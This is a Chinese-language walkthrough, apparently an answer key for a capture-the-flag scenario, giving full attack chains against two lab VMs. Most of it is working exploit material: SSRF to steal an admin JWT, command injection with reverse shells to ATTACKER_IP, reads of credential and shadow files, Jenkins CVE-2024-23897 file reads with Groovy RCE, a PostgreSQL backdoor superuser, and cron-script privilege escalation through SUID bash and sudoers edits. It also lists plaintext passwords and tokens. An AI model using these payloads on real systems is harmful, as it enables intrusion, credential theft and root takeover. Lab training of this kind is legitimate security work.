# 场景B — 攻击链完整复现指南

> **环境**: VM-B1 (192.168.110.1) → VM-B2 (192.168.110.2)
> **总分**: 1590分 (8条链)
> **格式**: 每条链提供Yakit可导入的原始数据包

---

## 0. 环境拓扑

```
外部攻击者
    │
    ▼
┌─────────────────────────────┐
│ VM-B1 (DMZ)                 │
│ Nginx :80 → Flask :5000     │
│ 广电网络监控仪表盘 v3.2      │
│ Cookie认证 (auth_user/role) │
│ SSRF: ?page=probe&target=   │
│ /opt/monitor/app.py         │
│ /opt/configs/api_config.yaml│
│ /opt/monitor/cleanup.sh 777 │
│ cron */5 → root             │
└──────────┬──────────────────┘
           │ 192.168.110.0/24
           ▼
┌─────────────────────────────┐
│ VM-B2 (Internal)            │
│ Go API Gateway :8080        │
│   /api/diag → 命令注入       │
│   /api/admin/token → JWT    │
│   /api/admin/users          │
│ PostgreSQL :5432            │
│   monitor (superuser)       │
│   monitor_ro (read-only)    │
│ Jenkins 2.440.3 :8081       │
│   CVE-2024-23897 CLI文件读   │
│ /opt/jenkins_backup.sh 777  │
│ cron 2am → root             │
└─────────────────────────────┘
```

## 0.1 环境部署验证清单

在开始复现前，确认以下服务正常：

```bash
# === VM-B1 验证 ===
# 1. 监控仪表盘首页
curl -s -o /dev/null -w "%{http_code}" http://192.168.110.1/
# 期望: 200

# 2. 登录验证
curl -s -X POST -d "username=admin&password=admin123" \
  -o /dev/null -w "%{http_code}" http://192.168.110.1/
# 期望: 302 (登录成功重定向)

# 3. SSRF探测页
curl -s -b "auth_user=admin; auth_role=viewer" \
  "http://192.168.110.1/?page=probe"
# 期望: 返回探测表单HTML

# 4. 管理面板 (operator角色)
curl -s -b "auth_user=operator; auth_role=admin" \
  "http://192.168.110.1/?page=admin"
# 期望: 返回管理面板HTML

# === VM-B2 验证 (从B1或直连) ===
# 5. Go API健康检查
curl -s http://192.168.110.2:8080/api/health
# 期望: {"status":"ok","data":{"service":"api-gateway"...}}

# 6. 命令注入验证
curl -s "http://192.168.110.2:8080/api/diag?cmd=ping&target=127.0.0.1%3bid"
# 期望: JSON含 "uid=997(api)"

# 7. Admin Token端点
curl -s http://192.168.110.2:8080/api/admin/token
# 期望: JSON含 admin JWT token

# 8. Jenkins
curl -s -o /dev/null -w "%{http_code}" http://192.168.110.2:8081/
# 期望: 403 (Jenkins运行中)
```

---

## 0.2 凭据汇总

| 位置 | 用户名 | 密码/Hash | 角色 |
|------|--------|-----------|------|
| B1 Flask USERS | admin | SHA256: `240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9` = `admin123` | viewer |
| B1 Flask USERS | operator | SHA256: `ecbcd5897f108cd4b38ba42b73e54c19a4399c71b66f124f9d0718f9de4d1a98` | admin |
| B1 api_config.yaml | monitor_ro | `M0n1t0rR0@2024!` | PG只读 |
| B1 systemd env | monitor | `M0n1t0r@DB#2024` | PG superuser |
| B2 systemd env | monitor | `M0n1t0r@DB#2024` | PG superuser |
| B2 Go API | — | JWT: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.8f7d3b2a1c4e5f6a7b8c9d0e1f2a3b4c` | API admin |
| B2 Jenkins | admin | (需通过CVE-2024-23897读取config.xml获取) | Jenkins admin |
| SSH (B1/B2) | gdadmin | `Gdadmin@123` | sudo |

---

## 攻击流程图

```
B-1 (20pts)                   B-2 (200pts)              B-3 (300pts)
admin/admin123  ──────────►  SSRF探头                  Go API命令注入
 Cookie登录                    │                         │
                              ▼                         ▼
                         /api/admin/token           ping;id → uid=997(api)
                         获取JWT admin token         反向shell到B2

B-4 (100pts)                  B-5 (100pts)              B-6 (100pts)
B2 shell中读取               B2 shell中读取            B1 shell中写
api_config.yaml              systemd env               cleanup.sh
monitor_ro 只读PG             monitor superuser         cron */5 → root@B1

B-7 (500pts)                  B-8 (270pts)
Jenkins CLI文件读              B2 shell (jenkins用户)
CVE-2024-23897                写 jenkins_backup.sh
→ 读取admin密码hash            cron 2am → root@B2
→ Groovy RCE → shell@B2
```

---

## B-1: 默认口令登录 (20分)

**入口**: POST `/` 表单登录
**认证方式**: Cookie (auth_user / auth_role)
**弱口令**: admin / admin123 → viewer 角色

### 原始数据包 (Yakit)

```http
POST / HTTP/1.1
Host: 192.168.110.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Accept: */*
User-Agent: Mozilla/5.0
Connection: close

username=admin&password=admin123
```

### 预期响应

```http
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=utf-8
Set-Cookie: auth_user=admin; Path=/
Set-Cookie: auth_role=viewer; Path=/
Location: /
```

### 带Cookie访问仪表盘

```http
GET / HTTP/1.1
Host: 192.168.110.1
Cookie: auth_user=admin; auth_role=viewer
Accept: */*
User-Agent: Mozilla/5.0
Connection: close


```

### 预期响应

返回监控仪表盘HTML，包含8个节点状态、CPU/内存/运行时间表格。

### operator 账号信息

operator 密码不在 `admin123`，需通过 hashcat 破解 SHA256：
```
ecbcd5897f108cd4b38ba42b73e54c19a4399c71b66f124f9d0718f9de4d1a98
```
登录后 role=admin，可访问管理面板 `?page=admin`。

### 复现步骤

```bash
# 1. 登录
curl -v -X POST -d "username=admin&password=admin123" http://192.168.110.1/

# 2. 带Cookie访问仪表盘
curl -s -b "auth_user=admin; auth_role=viewer" http://192.168.110.1/

# 3. 尝试operator登录 (需要破解密码)
# operator hash: ecbcd5897f108cd4b38ba42b73e54c19a4399c71b66f124f9d0718f9de4d1a98
# role=admin，可访问管理面板
```

---

## B-2: SSRF获取JWT Token (200分)

**入口**: `?page=probe&target=<URL>` (需已登录)
**漏洞**: Flask `requests.get(target)` 无URL白名单校验
**目标**: 通过SSRF访问B2内网Go API获取admin JWT

### Step 1: 登录获取Cookie

```http
POST / HTTP/1.1
Host: 192.168.110.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=admin&password=admin123
```

### Step 2: SSRF访问API健康检查

```http
GET /?page=probe&target=http://192.168.110.2:8080/api/health HTTP/1.1
Host: 192.168.110.1
Cookie: auth_user=admin; auth_role=viewer
Accept: */*
User-Agent: Mozilla/5.0
Connection: close


```

### 预期响应

HTML页面中 `<pre>` 标签内包含 (Jinja2 auto-escaped HTML):
```html
<pre>HTTP 200

{&#34;status&#34;:&#34;ok&#34;,&#34;data&#34;:{&#34;endpoints&#34;:[&#34;/api/health&#34;,&#34;/api/diag&#34;,&#34;/api/admin/token&#34;,&#34;/api/admin/users&#34;],&#34;service&#34;:&#34;api-gateway&#34;,&#34;uptime&#34;:&#34;7d 12h&#34;,&#34;version&#34;:&#34;3.2.1&#34;}}
</pre>
```

**Yakit提取**: 将 `&#34;` 替换为 `"` 即可得到原始JSON。

### Step 3: SSRF获取Admin Token

```http
GET /?page=probe&target=http://192.168.110.2:8080/api/admin/token HTTP/1.1
Host: 192.168.110.1
Cookie: auth_user=admin; auth_role=viewer
Accept: */*
User-Agent: Mozilla/5.0
Connection: close


```

### 预期响应

```html
<pre>HTTP 200

{&#34;status&#34;:&#34;ok&#34;,&#34;data&#34;:{&#34;id&#34;:1,&#34;username&#34;:&#34;admin&#34;,&#34;role&#34;:&#34;admin&#34;,&#34;token&#34;:&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.8f7d3b2a1c4e5f6a7b8c9d0e1f2a3b4c&#34;}}
</pre>
```

**提取JWT Token**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.8f7d3b2a1c4e5f6a7b8c9d0e1f2a3b4c`

### Step 4: SSRF获取用户列表

```http
GET /?page=probe&target=http://192.168.110.2:8080/api/admin/users HTTP/1.1
Host: 192.168.110.1
Cookie: auth_user=admin; auth_role=viewer
Accept: */*
User-Agent: Mozilla/5.0
Connection: close


```

### 预期响应

```html
<pre>HTTP 200

{&#34;status&#34;:&#34;ok&#34;,&#34;data&#34;:[{&#34;id&#34;:1,&#34;username&#34;:&#34;admin&#34;,&#34;role&#34;:&#34;admin&#34;,&#34;token&#34;:&#34;&#34;},{&#34;id&#34;:2,&#34;username&#34;:&#34;operator&#34;,&#34;role&#34;:&#34;operator&#34;,&#34;token&#34;:&#34;&#34;},{&#34;id&#34;:3,&#34;username&#34;:&#34;monitor&#34;,&#34;role&#34;:&#34;viewer&#34;,&#34;token&#34;:&#34;&#34;}]}
</pre>
```

### 复现步骤

```bash
# 1. 登录
curl -c /tmp/cookies.txt -X POST \
  -d "username=admin&password=admin123" http://192.168.110.1/

# 2. SSRF探测API (发现端点)
curl -s -b /tmp/cookies.txt \
  "http://192.168.110.1/?page=probe&target=http://192.168.110.2:8080/api/health"

# 3. SSRF获取JWT token
curl -s -b /tmp/cookies.txt \
  "http://192.168.110.1/?page=probe&target=http://192.168.110.2:8080/api/admin/token"

# 4. SSRF获取用户列表
curl -s -b /tmp/cookies.txt \
  "http://192.168.110.1/?page=probe&target=http://192.168.110.2:8080/api/admin/users"

# 5. 也可尝试访问内网其他资源:
# curl -s -b /tmp/cookies.txt "http://192.168.110.1/?page=probe&target=http://192.168.110.2:5432/"
# curl -s -b /tmp/cookies.txt "http://192.168.110.1/?page=probe&target=http://192.168.110.2:8081/"
```

---

## B-3: Go API命令注入 → Shell@B2 (300分)

**入口**: `/api/diag?cmd=ping&target=<INJECTION>`
**漏洞**: `strings.HasPrefix()` 白名单绕过 → `exec.Command("sh", "-c", ...)`
**执行用户**: `uid=997(api)` (已修复为非root)
**路径**: 可从B1 SSRF调用，或直连B2:8080

### 漏洞原理

Go代码:
```go
// Whitelist check... but only checks if cmd STARTS with allowed value
validCmds := []string{"ping", "traceroute", "nslookup"}
for _, v := range validCmds {
    if strings.HasPrefix(cmd, v) {  // ← ping;id passes (starts with "ping")
        valid = true
        break
    }
}
// VULNERABLE: Command injection via shell execution
shellCmd := fmt.Sprintf("%s -c 3 %s 2>&1", cmd, target)
out, err := exec.Command("sh", "-c", shellCmd).CombinedOutput()
```

Payload格式: `cmd=ping&target=127.0.0.1;COMMAND`

### 执行id命令

```http
GET /api/diag?cmd=ping&target=127.0.0.1%3bid HTTP/1.1
Host: 192.168.110.2:8080
Accept: */*
User-Agent: Mozilla/5.0
Connection: close


```

**预期响应**:
```json
{
  "status": "ok",
  "data": {
    "command": "ping -c 3 127.0.0.1;id 2>&1",
    "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.079 ms\n...\nuid=997(api) gid=997(api) groups=997(api)\n"
  }
}
```

### 执行whoami

```http
GET /api/diag?cmd=ping&target=127.0.0.1%3bwhoami HTTP/1.1
Host: 192.168.110.2:8080
Accept: */*
User-Agent: Mozilla/5.0
Connection: close


```

**预期响应**: output包含 `api`

### 通过B1 SSRF执行命令注入

```http
GET /?page=probe&target=http://192.168.110.2:8080/api/diag?cmd=ping%26target=127.0.0.1%253bid HTTP/1.1
Host: 192.168.110.1
Cookie: auth_user=admin; auth_role=viewer
Accept: */*
User-Agent: Mozilla/5.0
Connection: close


```

**注意**: 通过SSRF时需双重URL编码。`;` → `%253b`

### 反弹Shell Payload

```http
GET /api/diag?cmd=ping&target=127.0.0.1%3bbash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261' HTTP/1.1
Host: 192.168.110.2:8080
Accept: */*


```

### 复现步骤

```bash
# 1. 验证命令注入
curl -s "http://192.168.110.2:8080/api/diag?cmd=ping&target=127.0.0.1%3bid"

# 2. 查看当前用户
curl -s "http://192.168.110.2:8080/api/diag?cmd=ping&target=127.0.0.1%3bwhoami"
# → api

# 3. 枚举文件 (通过cmd参数前缀绕过)
curl -s "http://192.168.110.2:8080/api/diag?cmd=ping&target=127.0.0.1%3bls+-la+/opt"

# 4. 读取PG凭据 (B2侧)
curl -s "http://192.168.110.2:8080/api/diag?cmd=ping&target=127.0.0.1%3bcat+/etc/systemd/system/api-gateway.service"

# 5. 反弹shell (需要url编码全部特殊字符)
# ATTACKER_IP = 你的攻击机IP
curl -s "http://192.168.110.2:8080/api/diag?cmd=nslookup&target=google.com%3bbash+-c+%27bash+-i+%3E%26+/dev/tcp/ATTACKER_IP/4444+0%3E%261%27"

# 6. 通过B1 SSRF执行 (双重编码)
# 第一层: ; → %3b, 空格 → +
# 第二层: % → %25
curl -s -b /tmp/cookies.txt \
  "http://192.168.110.1/?page=probe&target=http://192.168.110.2:8080/api/diag%3fcmd%3dping%26target%3d127.0.0.1%25253bid"
```

---

## B-4: 配置文件泄露PG只读凭据 (100分)

**入口**: B2 shell (api用户) 或 B1 shell
**目标**: 读取 `/opt/configs/api_config.yaml` 获取 monitor_ro 凭据

### 在B2上读取 (api用户)

```bash
# B2 shell中:
cat /opt/configs/api_config.yaml
```

**文件内容**:
```yaml
# API Gateway Configuration
api_gateway:
  host: 192.168.110.2
  port: 8080
  protocol: http

# PostgreSQL Read-Only Account
database_ro:
  host: 192.168.110.2
  port: 5432
  user: monitor_ro
  password: M0n1t0rR0@2024!
  database: monitor
```

### 通过命令注入远程读取

```http
GET /api/diag?cmd=ping&target=127.0.0.1%3bcat+/opt/configs/api_config.yaml HTTP/1.1
Host: 192.168.110.2:8080
Accept: */*
Connection: close


```

### 在B1上读取 (需先获得B1 shell)

```bash
# B1 shell中 (通过B-6提权后或定时任务写入webshell):
cat /opt/configs/api_config.yaml
ls -la /opt/configs/api_config.yaml
# -rw-r--r-- 1 root root 240 ... /opt/configs/api_config.yaml
```

### 连接PostgreSQL (只读)

```bash
psql -h 192.168.110.2 -U monitor_ro -d monitor
# Password: M0n1t0rR0@2024!

# 验证连接
SELECT 1 as connected;

# 查看表
\dt
# 查看用户表数据
SELECT * FROM users;
```

### 复现步骤

```bash
# 方式1: 命令注入读取
curl -s "http://192.168.110.2:8080/api/diag?cmd=ping&target=127.0.0.1%3bcat+/opt/configs/api_config.yaml"

# 方式2: B2 shell中直接读取
# (获得B2 shell后) cat /opt/configs/api_config.yaml

# 方式3: B1 shell中读取
# (获得B1 shell后) cat /opt/configs/api_config.yaml
```

---

## B-5: 环境变量泄露PG Superuser凭据 (100分)

**入口**: 读取 systemd service 文件中的 Environment 变量
**凭据**: `monitor` / `M0n1t0r@DB#2024` (PostgreSQL superuser)
**位置**: 
- B1 `/etc/systemd/system/monitor-dashboard.service`
- B2 `/etc/systemd/system/api-gateway.service`

### B1 systemd 服务文件

```bash
cat /etc/systemd/system/monitor-dashboard.service
```

```ini
[Unit]
Description=Broadcast Monitor Dashboard
After=network.target

[Service]
User=www-data
WorkingDirectory=/opt/monitor
ExecStart=/usr/local/bin/gunicorn -b 127.0.0.1:5000 app:app
Restart=always
Environment=PG_HOST=192.168.110.2
Environment=PG_PORT=5432
Environment=PG_USER=monitor
Environment=PG_PASS=M0n1t0r@DB#2024
Environment=PG_DB=monitor
Environment=API_GATEWAY=http://192.168.110.2:8080

[Install]
WantedBy=multi-user.target
```

### B2 systemd 服务文件

```bash
cat /etc/systemd/system/api-gateway.service
```

```ini
[Service]
Type=simple
User=api
Group=api
WorkingDirectory=/opt/api-gateway
ExecStart=/opt/api-gateway/api-gateway
Restart=always
Environment=PG_HOST=localhost
Environment=PG_PORT=5432
Environment=PG_USER=monitor
Environment=PG_PASS=M0n1t0r@DB#2024
Environment=PG_DB=monitor

[Install]
WantedBy=multi-user.target
```

### 通过命令注入读取(B2)

```http
GET /api/diag?cmd=ping&target=127.0.0.1%3bcat+/etc/systemd/system/api-gateway.service HTTP/1.1
Host: 192.168.110.2:8080
Accept: */*
Connection: close


```

### 连接PostgreSQL (superuser)

```bash
psql -h 192.168.110.2 -U monitor -d monitor
# Password: M0n1t0r@DB#2024

# 验证superuser权限
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
# 预期: monitor | t

# 查看所有数据库
\l

# 读取文件 (superuser 可使用 pg_read_file)
SELECT pg_read_file('/etc/passwd');

# 创建superuser后门账号
CREATE USER backdoor WITH SUPERUSER PASSWORD 'Backdoor@123';
```

### 复现步骤

```bash
# 1. 从B2命令注入读取服务文件
curl -s "http://192.168.110.2:8080/api/diag?cmd=ping&target=127.0.0.1%3bcat+/etc/systemd/system/api-gateway.service"

# 2. 从B1 shell读取 (如已获得)
cat /etc/systemd/system/monitor-dashboard.service

# 3. 连接PG superuser
psql -h 192.168.110.2 -U monitor -d monitor
# 输入密码: M0n1t0r@DB#2024

# 4. SUPERUSER 利用
SELECT pg_read_file('/etc/passwd');
CREATE USER attacker WITH SUPERUSER PASSWORD 'Pass@123';
```

---

## B-6: Cron脚本提权 → root@B1 (100分)

**入口**: B1 shell 中写入 `/opt/monitor/cleanup.sh`
**条件**: cleanup.sh 权限 777，每5分钟以root身份执行
**触发**: 等待最多5分钟

### 查看当前状态

```bash
ls -la /opt/monitor/cleanup.sh
# -rwxrwxrwx 1 root root 131 ... /opt/monitor/cleanup.sh

cat /etc/cron.d/monitor-cleanup
# */5 * * * * root /opt/monitor/cleanup.sh
```

### 写入提权Payload

```bash
# 方案A: SUID bash
echo '#!/bin/bash' > /opt/monitor/cleanup.sh
echo 'chmod u+s /bin/bash' >> /opt/monitor/cleanup.sh

# 方案B: 反弹shell (推荐)
echo '#!/bin/bash' > /opt/monitor/cleanup.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' >> /opt/monitor/cleanup.sh

# 方案C: 添加sudo权限
echo '#!/bin/bash' > /opt/monitor/cleanup.sh
echo 'echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> /opt/monitor/cleanup.sh
```

### 等待执行

```bash
# 等待最多5分钟 (cron */5)
sleep 300

# 方案A: SUID后
/bin/bash -p
id  # uid=0(root) gid=0(root)

# 方案B: nc监听
nc -lvnp 5555
# 收到root反弹shell

# 方案C: sudo -i
sudo -i
id  # uid=0(root)
```

### 复现步骤

```bash
# 1. 获得B1 shell后，检查cron
cat /etc/cron.d/monitor-cleanup
ls -la /opt/monitor/cleanup.sh

# 2. 写入SUID bash payload
echo '#!/bin/bash' > /opt/monitor/cleanup.sh
echo 'chmod u+s /bin/bash' >> /opt/monitor/cleanup.sh

# 3. 等待cron执行 (最多5分钟)
watch -n 10 'ls -la /bin/bash'
# 看到 -rwsr-xr-x 后

# 4. 提权
/bin/bash -p
id  # uid=0(root) gid=0(root)

# 5. 获取flag
cat /root/flag.txt
```

---

## B-7: Jenkins CVE-2024-23897 文件读取 + Groovy RCE (500分)

**入口**: Jenkins 2.440.3 on `http://192.168.110.2:8081/`
**漏洞**: CVE-2024-23897 — CLI `args4j` 库文件读取
**目标**: 读取用户配置获取密码hash → 登录 → Script Console Groovy RCE

### Step 1: 确认Jenkins版本

```http
GET / HTTP/1.1
Host: 192.168.110.2:8081
Accept: */*
User-Agent: Mozilla/5.0
Connection: close


```

**预期**: HTTP 403 + Jenkins headers (`X-Jenkins: 2.440.3`)

### Step 2: CLI文件读取 — /etc/passwd

```bash
# 下载 jenkins-cli.jar
wget http://192.168.110.2:8081/jnlpJars/jenkins-cli.jar -O /tmp/jenkins-cli.jar

# CVE-2024-23897: 通过@符号路径遍历读取文件
java -jar /tmp/jenkins-cli.jar -s http://192.168.110.2:8081/ help "@/etc/passwd" 2>&1
```

**预期输出**:
```
ERROR: No such command available: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
ERROR: Too many arguments: ...
```

### Step 3: 读取Jenkins用户配置

```bash
# 读取初始管理员密码
java -jar /tmp/jenkins-cli.jar -s http://192.168.110.2:8081/ help "@/var/lib/jenkins/secrets/initialAdminPassword" 2>&1

# 读取admin用户配置 (获取密码hash)
java -jar /tmp/jenkins-cli.jar -s http://192.168.110.2:8081/ help "@/var/lib/jenkins/users/admin_16367245245363213231/config.xml" 2>&1
```

**预期输出** (config.xml内容):
```xml
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <fullName>Jenkins Admin</fullName>
  <properties>
    <jenkins.security.ApiTokenProperty>
      <apiToken>...</apiToken>
    </jenkins.security.ApiTokenProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$...</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
  </properties>
</user>
```

### Step 4: 破解密码Hash

```bash
# jbcrypt hash → hashcat mode 3200
echo '$2a$10$...' > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Step 5: 登录Jenkins → Script Console

用破解的密码登录 `http://192.168.110.2:8081/login`，进入 **Manage Jenkins → Script Console**。

Groovy RCE Payload:
```groovy
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = 'id'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Step 6: Groovy反弹Shell

```groovy
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1"'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### 无密码登录绕过 (备选)

如果初始密码不可用，可尝试通过CLI读取后注入:

```bash
# 利用CVE-2024-23897读取任意文件
# 读取SSH私钥
java -jar jenkins-cli.jar -s http://192.168.110.2:8081/ help "@/home/gdadmin/.ssh/id_rsa" 2>&1

# 读取shadow
java -jar jenkins-cli.jar -s http://192.168.110.2:8081/ help "@/etc/shadow" 2>&1
# (需要jenkins用户有读取权限)
```

### 复现步骤

```bash
# === 在攻击机或B1 shell上执行 ===

# 1. 下载CLI jar
wget http://192.168.110.2:8081/jnlpJars/jenkins-cli.jar -O /tmp/jc.jar

# 2. 读取/etc/passwd (验证漏洞)
java -jar /tmp/jc.jar -s http://192.168.110.2:8081/ help "@/etc/passwd" 2>&1 | grep -E 'root:|jenkins:'

# 3. 读取admin配置
java -jar /tmp/jc.jar -s http://192.168.110.2:8081/ \
  help "@/var/lib/jenkins/users/admin_16367245245363213231/config.xml" 2>&1 | grep passwordHash

# 4. 破解hash (如需要)
# hashcat -m 3200 hash.txt wordlist.txt

# 5. 登录Jenkins
# 浏览器访问 http://192.168.110.2:8081/login
# 或用curl:
curl -v -c /tmp/jenkins_cookie.txt \
  -d "j_username=admin&j_password=CRACKED_PASSWORD&from=%2F&Submit=登录" \
  http://192.168.110.2:8081/j_spring_security_check

# 6. 执行Groovy RCE
curl -b /tmp/jenkins_cookie.txt \
  -d "script=println 'id'.execute().text" \
  http://192.168.110.2:8081/script

# 7. 反弹shell
curl -b /tmp/jenkins_cookie.txt \
  --data-urlencode 'script=def proc = "bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1\"".execute()' \
  http://192.168.110.2:8081/script
```

---

## B-8: Jenkins Backup Cron提权 → root@B2 (270分)

**入口**: B2 shell (jenkins用户，从B-7 Groovy RCE获得)
**条件**: `/opt/jenkins_backup.sh` 权限 777，每天凌晨2:00以root执行
**触发**: 等待cron或手动触发

### 查看当前状态

```bash
ls -la /opt/jenkins_backup.sh
# -rwxrwxrwx 1 root root 86 May 20 02:15 /opt/jenkins_backup.sh

cat /opt/jenkins_backup.sh
# #!/bin/bash
# tar czf /var/backups/jenkins-20260520.tar.gz /var/lib/jenkins 2>/dev/null

cat /etc/cron.d/jenkins-backup 2>/dev/null || grep jenkins_backup /etc/crontab
# 0 2 * * * root /opt/jenkins_backup.sh
```

### 写入提权Payload

```bash
# 方案A: SUID bash
echo '#!/bin/bash' > /opt/jenkins_backup.sh
echo 'chmod u+s /bin/bash' >> /opt/jenkins_backup.sh

# 方案B: 反弹shell (推荐)
echo '#!/bin/bash' > /opt/jenkins_backup.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1' >> /opt/jenkins_backup.sh

# 方案C: 添加sudo权限
echo '#!/bin/bash' > /opt/jenkins_backup.sh
echo 'usermod -aG sudo jenkins' >> /opt/jenkins_backup.sh
echo 'echo "jenkins ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> /opt/jenkins_backup.sh
```

### 等待或手动触发

```bash
# Cron在每天凌晨2:00执行，手动可触发 (如果没有sudo):
# 查看当前时间
date

# 等待到 02:00
# 或: 如果系统时间精确，等待即可

# 方案A: 检查SUID
watch -n 60 'ls -la /bin/bash'
# 看到 -rwsr-xr-x 后:
/bin/bash -p
id  # uid=0(root)

# 方案B: nc监听端口7777等待
nc -lvnp 7777
```

### 复现步骤

```bash
# 1. B-7获得jenkins shell后
id  # uid=xxx(jenkins)

# 2. 确认可写cron脚本
ls -la /opt/jenkins_backup.sh
# -rwxrwxrwx 1 root root 86 ...

# 3. 写入SUID bash
echo '#!/bin/bash' > /opt/jenkins_backup.sh
echo 'chmod u+s /bin/bash' >> /opt/jenkins_backup.sh

# 4. 确认写入无误
cat /opt/jenkins_backup.sh

# 5. 等待cron执行 (00:02) 或 手动触发
# 如果cron未到时间，可尝试:
# sudo /opt/jenkins_backup.sh (jenkins用户可能有sudo? 不一定)
# 或:
# at now + 1 minute -f /opt/jenkins_backup.sh (如果at可用)

# 6. 提权
/bin/bash -p
id  # uid=0(root) gid=0(root)

# 7. 获取flag
cat /root/flag.txt
```

---

## 得分汇总

| 编号 | 攻击链 | 分值 | 关键入口 |
|------|--------|------|----------|
| B-1 | 默认口令登录 | 20 | POST `/` admin/admin123 |
| B-2 | SSRF获取JWT | 200 | `?page=probe&target=` → Go API |
| B-3 | Go API命令注入 | 300 | `/api/diag?cmd=ping&target=;CMD` |
| B-4 | 配置文件泄露PG只读 | 100 | `/opt/configs/api_config.yaml` |
| B-5 | 环境变量泄露PG superuser | 100 | systemd Environment= |
| B-6 | Cron脚本提权 B1 | 100 | `/opt/monitor/cleanup.sh` 777 |
| B-7 | Jenkins CLI文件读+RCE | 500 | CVE-2024-23897 + Groovy |
| B-8 | Cron脚本提权 B2 | 270 | `/opt/jenkins_backup.sh` 777 |
| **总计** | | **1590** | |

---

## 与 VERIFICATION.md 的差异说明

实际部署环境与 VERIFICATION.md 规范存在以下差异，本文档以实际环境为准：

| 项目 | VERIFICATION.md 描述 | 实际环境 |
|------|---------------------|----------|
| B-1 登录接口 | `POST /api/login` JSON | `POST /` 表单 (form-urlencoded) |
| B-2 SSRF接口 | `GET /api/fetch?url=` | `GET /?page=probe&target=` |
| B-3 命令注入位置 | Flask `/api/exec` B1侧 | Go API `/api/diag` B2侧 |
| B-3 执行用户 | www-data | api (uid=997) |
| Flutter认证 | JWT Bearer Token | Cookie: auth_user / auth_role |
| B-7 Jenkins端口 | 8080 | 8081 (8080被Go API占用) |
